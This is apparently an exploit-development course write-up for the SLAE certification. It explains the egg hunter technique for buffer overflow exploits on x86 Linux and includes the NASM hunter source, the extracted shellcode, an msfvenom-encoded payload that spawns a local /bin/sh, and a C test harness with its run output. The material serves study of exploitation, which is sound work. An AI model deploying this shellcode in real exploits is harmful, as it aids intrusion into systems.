---
title:  "SLAE x86 Assignment 3: Egg Hunter"
header:
  teaser: "/assets/images/slae32.png"
  teaser_home_page: true
#categories:
#  - exploit dev
classes: wide
#tags:
#  - exploit dev
#  - slae
---

![Shellcoding](/assets/images/slae32.png)

### Egg Hunter
------

* Learn about the Egg Hunter technique
* Create a working demo of the Egg Hunter
* Should be easily configurable for different payloads

#### Concept 
-----

Egg hunting is the technique whereby an Egg Hunter is used to hunt for the actual payload to be executed, which in this case is marked or tagged by an Egg. 

The technique is used to avoid the limitation of consecutive memory locations available to insert the payload after an overwrite (typically seen in a Stack-based Buffer Overlfow). Once the Egg Hunter is executed it searches for the Egg which is prefixed with the larger payload - effectively triggering the execution of the payload.

![Reverse Shell](/assets/images/EggHunter.jpg)

Caveats to an Egg Hunter: 

* Must avoid locating itself in memory and jumping to the incorrect address 
* Must be robust
* Must be small in size
* Must be fast

A 4 byte Egg can be used and repeated twice to mark the payload, the Virtual Address Space (VAS) is searched for these two consecutive tags and redirects execution flow once the pattern is matched.

The popular paper by Skape was referenced to better understand the implementation of the Egg Hunter, the link to the research can be found [here] [skape-link].

[skape-link]: http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf

In summary, the following steps will be implemented:

* Generate shellcode
* Define Egg value
* Define Egg Hunter
* Generate customized shellcode

#### Access Syscall
----

A look up in the header file reveals the values for the access syscall:

```bash
osboxes@osboxes:~/Downloads/SLAE$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep access
#define __NR_access		 33
```

The definition of the access syscall function in the man pages describes the arguments required:

```bash
osboxes@osboxes:~/Downloads/SLAE$ man access

ACCESS(2)                                  Linux Programmer's Manual                                 ACCESS(2)

NAME
       access - check real user's permissions for a file

SYNOPSIS
       #include <unistd.h>

       int access(const char *pathname, int mode);

DESCRIPTION
       access()  checks  whether  the calling process can access the file pathname.  If pathname is a symbolic
       link, it is dereferenced.

       The mode specifies the accessibility check(s) to be performed, and is either the value F_OK, or a  mask
       consisting  of  the bitwise OR of one or more of R_OK, W_OK, and X_OK.  F_OK tests for the existence of
       the file.  R_OK, W_OK, and X_OK test whether the file exists and grants read, write, and  execute  per-
       missions, respectively.

       The  check  is  done  using the calling process's real UID and GID, rather than the effective IDs as is
       done when actually attempting an operation (e.g., open(2)) on the file.  This allows  set-user-ID  pro-
       grams to easily determine the invoking user's authority.

       If the calling process is privileged (i.e., its real UID is zero), then an X_OK check is successful for
       a regular file if execute permission is enabled for any of the file owner, group, or other.

RETURN VALUE
       On success (all requested permissions granted), zero is returned.  On error (at least one bit  in  mode
       asked  for a permission that is denied, or some other error occurred), -1 is returned, and errno is set
       appropriately.

ERRORS
       access() shall fail if:

       EACCES The requested access would be denied to the file, or search permission is denied for one of  the
              directories in the path prefix of pathname.  (See also path_resolution(7).)

       ELOOP  Too many symbolic links were encountered in resolving pathname.

       ENAMETOOLONG
              pathname is too long.

       ENOENT A component of pathname does not exist or is a dangling symbolic link.

       ENOTDIR
              A component used as a directory in pathname is not, in fact, a directory.

       EROFS  Write permission was requested for a file on a read-only file system.

       access() may fail if:

       EFAULT pathname points outside your accessible address space.
```

Note is made of the fact that EFAULT (0xf2) should be avoided, as the error states the pathname would point outside the accessible address space.

#### Assembly Code (Updating the Skape code reference)
-------------

````nasm
; Filename: egghunter.nasm
; Author: h3ll0clar1c3
; Purpose: Egghunter, spawning a shell on the local host
; Compilation: ./compile.sh egghunter
; Usage: ./egghunter
; Shellcode size: 113 bytes
; Architecture: x86

global   _start

section .text
        _start:

	; initialize register
	xor edx, edx
	
	next_page:
	or dx, 0xfff		; set dx to 4095
	
	next_address:
	inc edx			; incdx to 4096 (PAGE_SIZE)
	lea ebx, [edx +0x4]	; load 0x1004 into ebx
	push byte +0x21		; 0x21 is dec 33 (access syscall)
	pop eax			; put the syscall value into eax
	int 0x80		; call the interrupt, execute the syscall
	
	cmp al, 0xf2		; check if return value is EFAULT (0xf2)
	jz next_page		; if EFAULT is encountered, jump back to next_page 
	mov eax, 0x50905090	; move unique egg value into eax
	mov edi, edx
	
	; search for the egg
	scasd			; search for first 4 byte pattern of the egg
	jnz next_address
	
	; search again for 2nd copy of the egg 
	scasd			; search for second 4 byte pattern of the egg
	jnz next_address
	jmp edi			; jump to egg payload
````

The Assembly code is compiled by assembling with Nasm, and linking with the following bash script whilst outputting an executable binary:

```bash
osboxes@osboxes:~/Downloads/SLAE$ cat compile.sh
#!/bin/bash

echo '[+] Assembling with Nasm ... '
nasm -f elf32 -o $1.o $1.nasm

echo '[+] Linking ...'
ld -o $1 $1.o

echo '[+] Done!'
```

The Assembly code compiled as an executable binary:

```bash
osboxes@osboxes:~/Downloads/SLAE$ ./compile.sh egghunter
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
```

#### Customize Shellcode (Different payloads)
------

Objdump is used to extract the shellcode from the Egg Hunter in hex format (Null free):

```bash
osboxes@osboxes:~/Downloads/SLAE$ objdump -d ./egghunter|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7"
```

Msfvenom is used to generate a payload that will be used along with the Egg Hunter in a C program. The payload will spawn a shell on the local host along with checking for Null bytes in the process.

```bash
osboxes@osboxes:~/Downloads/SLAE$ msfvenom -p linux/x86/exec CMD=/bin/sh -f c --arch x86 --platform linux -b \x00 
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 70 (iteration=0)
x86/shikata_ga_nai chosen with final size 70
Payload size: 70 bytes
Final size of c file: 319 bytes
unsigned char buf[] = 
"\xbd\xea\xfb\x87\x4a\xda\xdb\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
"\x0b\x31\x6a\x15\x03\x6a\x15\x83\xea\xfc\xe2\x1f\x91\x8c\x12"
"\x46\x34\xf5\xca\x55\xda\x70\xed\xcd\x33\xf0\x9a\x0d\x24\xd9"
"\x38\x64\xda\xac\x5e\x24\xca\xa7\xa0\xc8\x0a\x97\xc2\xa1\x64"
"\xc8\x71\x59\x79\x41\x25\x10\x98\xa0\x49";
```

The Egg is appended twice to this newly generated payload, the tagged Egg would precede the payload with the value "\x90\x50\x90\x50\x90\x50\x90\x50".

#### Egg Hunter in C
--------

The following C skeleton code will be used to demonstrate the Egg Hunter from a high-level language perspective. 

```c
/**
* Filename: shellcode.c
* Author: h3ll0clar1c3
* Purpose: Egghunter, spawning a shell on the local host  
* Compilation: gcc -fno-stack-protector -z execstack -m32 shellcode.c -o egghunter_final  
* Usage: ./egghunter_final
* Shellcode size: 113 bytes
* Architecture: x86
**/

#include <stdio.h>
#include <string.h>

unsigned char hunter[] = \
"\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee" // objdump -d
"\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";

unsigned char egg[] = \
"\x90\x50\x90\x50\x90\x50\x90\x50" // tagged egg
"\xbd\xea\xfb\x87\x4a\xda\xdb\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1" // msfvenom payload
"\x0b\x31\x6a\x15\x03\x6a\x15\x83\xea\xfc\xe2\x1f\x91\x8c\x12"
"\x46\x34\xf5\xca\x55\xda\x70\xed\xcd\x33\xf0\x9a\x0d\x24\xd9"
"\x38\x64\xda\xac\x5e\x24\xca\xa7\xa0\xc8\x0a\x97\xc2\xa1\x64"
"\xc8\x71\x59\x79\x41\x25\x10\x98\xa0\x49";

int main()
{
        printf("Hunter length: %d bytes\n", strlen(hunter));
        printf("Egg length: %d bytes\nHunting the egg...\n", strlen(egg));
        int (*ret)() = (int(*)())hunter;
        ret();
}
```

#### POC (C Code)
------

The C code is compiled as an executable ELF binary and executed:

```bash
osboxes@osboxes:~/Downloads/SLAE$ gcc -fno-stack-protector -z execstack -m32 shellcode.c -o egghunter_final
osboxes@osboxes:~/Downloads/SLAE$ ./egghunter_final 
Hunter length: 35 bytes
Egg length: 78 bytes
Hunting the egg...
$ id
uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
$ 
```

##### SLAE Disclaimer ####
---------

This blog post has been created for completing the requirements of the [SLAE certification] [slae-link].

Student ID: PA-14936

GitHub Repo: [Code][github-code]

[slae-link]: http:/securitytube-training.com/online-courses/securitytube-linux-assembly-expert
[github-code]: https://github.com/h3ll0clar1c3/SLAE/tree/master/Exam/Assignment2
